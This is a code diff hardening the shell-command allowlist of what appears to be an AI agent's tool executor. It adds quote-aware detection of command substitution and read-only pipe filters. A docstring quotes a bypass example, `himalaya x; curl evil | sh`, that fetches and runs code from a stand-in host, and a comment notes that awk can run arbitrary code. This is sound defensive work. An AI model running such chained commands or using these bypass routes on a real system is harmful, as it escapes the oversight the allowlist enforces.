@@ -81,21 +81,64 @@ class ToolExecutor:
     # Shell operators that separate one command from the next. A run_command
     # string may legitimately pipe between allowlisted tools (`himalaya … | jq …`),
     # so these can't be banned outright — but every resulting segment must itself
-    # start with an allowlisted prefix.
+    # start with an allowlisted prefix (or a safe downstream filter).
     _SEGMENT_OPS = frozenset({"|", "||", "&&", ";", "&", "\n"})
 
+    # Read-only filters allowed *after* a pipe even though they aren't data
+    # sources in ALLOWED_PREFIXES: `curl … | head`, `himalaya … | jq …`. The
+    # first pipeline segment must still be an allowlisted prefix — these only
+    # ride behind a pipe as pure output filters. `sed`/`awk` are deliberately
+    # excluded: both can execute arbitrary code (`awk 'BEGIN{system(...)}'`).
+    _SAFE_FILTERS = frozenset(
+        {"jq", "head", "tail", "rg", "cat", "sort", "uniq", "wc", "grep", "cut", "tr", "column"}
+    )
+
+    @staticmethod
+    def _has_live_substitution(command: str) -> bool:
+        """True if a backtick or ``$(`` appears outside single quotes.
+
+        :meth:`_exec` runs the command via ``/bin/sh -c``, where command
+        substitution stays live inside *double* quotes — only *single* quotes
+        make it literal. So a markdown code fence reaches an argument intact
+        when single-quoted (``--body '```code```'``) and is rejected when
+        unquoted or double-quoted, where sh would actually run the inner
+        command. Backslash-escaping inside double quotes is not decoded: we
+        stay strict on purpose, since the safe path is single-quoting.
+        """
+        quote: str | None = None  # None | "'" | '"'
+        n = len(command)
+        for i, c in enumerate(command):
+            if quote == "'":
+                if c == "'":
+                    quote = None
+            elif quote == '"':
+                if c == '"':
+                    quote = None
+                elif c == "`" or (c == "$" and i + 1 < n and command[i + 1] == "("):
+                    return True
+            elif c in ("'", '"'):
+                quote = c
+            elif c == "`" or (c == "$" and i + 1 < n and command[i + 1] == "("):
+                return True
+        return False
+
     def _command_allowed(self, command: str) -> bool:
-        """True if EVERY pipeline/sequence segment starts with an allowlisted prefix.
+        """True if EVERY pipeline/sequence segment is allowlisted.
 
         A first-token-only check let a chained tail ride in on an allowed head
         (`himalaya x; curl evil | sh` starts with `himalaya`, so it passed). This
         splits the command quote-aware via shlex: a pipe inside quotes — like
         `jq '.a | .b'` — stays one segment, while a real `himalaya … | jq …` splits
-        into two, each checked. Subshells and command substitution (`(`, `)`, `$(…)`,
-        backticks) are rejected outright: they run an inner command the prefix check
-        would never see. Last-line hard gate for LLM-issued commands only;
-        ``run_command_trusted`` (agent-built strings) bypasses it.
+        into two. The first segment must start with an allowlisted prefix; a
+        downstream segment may instead be a safe read filter (:attr:`_SAFE_FILTERS`).
+        Subshells (`( … )`) and command substitution (backticks, `$(…)`) are rejected
+        via :meth:`_has_live_substitution`: they run an inner command the prefix
+        check would never see. A backtick/`$(` inside single quotes is literal and
+        allowed, so markdown bodies survive intact. Last-line hard gate for
+        LLM-issued commands only; ``run_command_trusted`` bypasses it.
         """
+        if self._has_live_substitution(command):
+            return False
         try:
             lex = shlex.shlex(command, posix=True, punctuation_chars=True)
             lex.whitespace_split = True
@@ -110,16 +153,20 @@ class ToolExecutor:
             if tok in self._SEGMENT_OPS:
                 segment = []
                 segments.append(segment)
-            elif tok in ("(", ")") or "`" in tok:
-                return False  # subshell / command substitution
+            elif tok in ("(", ")"):
+                return False  # bare subshell
             else:
                 segment.append(tok)
-        for segment in segments:
+        for idx, segment in enumerate(segments):
             if not segment:
                 continue
             joined = " ".join(segment)
-            if not any(joined.startswith(p) for p in self.ALLOWED_PREFIXES):
-                return False
+            if any(joined.startswith(p) for p in self.ALLOWED_PREFIXES):
+                continue
+            # Downstream pipeline stages may be pure read-only filters.
+            if idx > 0 and segment[0] in self._SAFE_FILTERS:
+                continue
+            return False
         return True
 
     async def run_command(
@@ -143,9 +190,11 @@ class ToolExecutor:
         if not self._command_allowed(command):
             return {
                 "error": (
-                    "Command not allowed. Every piped/chained segment must start with one "
-                    f"of: {self.ALLOWED_PREFIXES}. Subshells, command substitution and "
-                    "backticks are rejected."
+                    "Command not allowed. The first segment must start with one of: "
+                    f"{self.ALLOWED_PREFIXES}; a segment after a pipe may instead be a "
+                    f"read-only filter ({sorted(self._SAFE_FILTERS)}). Subshells, "
+                    "command substitution and backticks are rejected unless single-quoted "
+                    "(single quotes make them literal, so quote markdown bodies as '…')."
                 )
             }
         # `browser.py explore` runs an inner LLM loop (many page steps) and needs
